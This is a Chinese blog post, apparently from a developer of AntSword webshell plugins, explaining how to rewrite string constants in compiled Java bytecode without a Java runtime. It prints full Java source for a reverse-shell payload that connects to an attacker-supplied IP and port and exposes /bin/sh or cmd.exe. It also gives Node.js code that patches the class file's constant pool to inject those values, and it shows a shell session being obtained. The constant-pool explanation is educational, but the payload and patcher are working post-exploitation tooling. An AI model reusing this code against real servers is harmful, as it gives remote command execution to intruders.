# 无java环境修改字节码

<meta name="referrer" content="no-referrer" />

## 前言

上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。

## 正文

### 需求

在[蚁剑改造计划之实现JSP一句话](https://yzddmr6.tk/posts/antsword-diy-3/)中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。

例如

```
POST:   ant=xxxxxxxxxxxxxxx&var1=/bin/bash&var2=whoami
```

蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。

### Java字节码结构

这里以As_Exploits中的jsp反弹shell的payload为例

```
import java.io.*;
import java.net.Socket;

public class ShellReverseTCP extends Thread {

    InputStream zj;
    OutputStream sd;
    public static String ip;
    public static String port;

    ShellReverseTCP(InputStream zj, OutputStream sd) {
        this.zj = zj;
        this.sd = sd;
    }

    public ShellReverseTCP() {

    }
    @Override
    public boolean equals(Object obj){
        ip="targetIP";
        port="targetPORT";
        try {
            RunShellReverseTCP();
            return true;
        }catch (Exception e){
            return false;
        }

    }

    public static void main(String[] args) {
        ip="192.168.88.129";
        port="9999";
        ShellReverseTCP shellReverseTCP = new ShellReverseTCP();
        shellReverseTCP.RunShellReverseTCP();
    }

    public void RunShellReverseTCP() {
        try {
            String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = new String("/bin/sh");
            } else {
                ShellPath = new String("cmd.exe");
            }

            Socket socket = new Socket(ip, Integer.parseInt(port));
            Process process = Runtime.getRuntime().exec(ShellPath);
            (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start();
            (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start();
        } catch (Exception e) {
        }
    }


    public void run() {
        BufferedReader yx = null;
        BufferedWriter jah = null;
        try {
            yx = new BufferedReader(new InputStreamReader(this.zj));
            jah = new BufferedWriter(new OutputStreamWriter(this.sd));
            char buffer[] = new char[8192];
            int length;
            while ((length = yx.read(buffer, 0, buffer.length)) > 0) {
                jah.write(buffer, 0, length);
                jah.flush();
            }
        } catch (Exception e) {
        }
        try {
            if (yx != null)
                yx.close();
            if (jah != null)
                jah.close();
        } catch (Exception e) {
        }
    }
}
```

main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。

用010editor打开编译后的字节码文件查看。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png)

最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png)

00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。

![image](https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png)

后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。

常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：

| 类型                             | 标志 | 描述                   |
| -------------------------------- | ---- | ---------------------- |
| CONSTANT_utf8_info               | 1    | UTF-8编码的字符串      |
| CONSTANT_Integer_info            | 3    | 整形字面量             |
| CONSTANT_Float_info              | 4    | 浮点型字面量           |
| CONSTANT_Long_info               | 5    | 长整型字面量           |
| CONSTANT_Double_info             | 6    | 双精度浮点型字面量     |
| CONSTANT_Class_info              | 7    | 类或接口的符号引用     |
| CONSTANT_String_info             | 8    | 字符串类型字面量       |
| CONSTANT_Fieldref_info           | 9    | 字段的符号引用         |
| CONSTANT_Methodref_info          | 10   | 类中方法的符号引用     |
| CONSTANT_InterfaceMethodref_info | 11   | 接口中方法的符号引用   |
| CONSTANT_NameAndType_info        | 12   | 字段或方法的符号引用   |
| CONSTANT_MethodHandle_info       | 15   | 表示方法句柄           |
| CONSTANT_MothodType_info         | 16   | 标志方法类型           |
| CONSTANT_InvokeDynamic_info      | 18   | 表示一个动态方法调用点 |

这14种类型的结构各不相同，如下表格所示：

![image](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png)``



> 注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。

从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。

我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。

也就是说关键的结构就是这个

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png)

其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。

结合文件来看

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png)

targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。

### 如何修改

既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。

把yan表哥的代码抽出来修改一下

```
function replaceClassStringVar(b64code, oldvar, newvar) {
    let code = Buffer.from(b64code, 'base64');//解码
    let hexcode = code.toString('hex');//转为16进制
    let hexoldvar = Buffer.from(oldvar).toString('hex');//转为16进制
    let oldpos = hexcode.indexOf(hexoldvar);
    if (oldpos > -1) {//判断字节码中是否包含目标字符串
      let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度
      let retcode = `${hexcode.slice(0, oldpos - 4)}${newlength}${Buffer.from(newvar).toString('hex')}${hexcode.slice(oldpos + hexoldvar.length)}`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容
      return Buffer.from(retcode, 'hex').toString('base64');//base64编码
    }
    console.log('nonono')
    return b64code;
  }

  function decimalToHex(d, padding) {
    var hex = Number(d).toString(16);
    padding = typeof (padding) === "undefined" || padding === null ? padding = 2 : padding;
    while (hex.length < padding) {
      hex = "0" + hex;//小于padding长度就填充0
    }
    return hex;
  }

content=`xxxxxxxxxxxxx`//要替换的字节码

content=replaceClassStringVar(content,'targetIP','192.168.88.129')
content=replaceClassStringVar(content,'targetPORT','9999')
console.log(content)
```

用命令还原一下文件

```
echo -n xxxxxx |baes64 -d |tee after.class
```

看一下修改后的结果

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png)

192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。

实际中是否能用呢？

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png)

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png)

回车，获得会话，说明修改是有效的。

## 最后

As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。
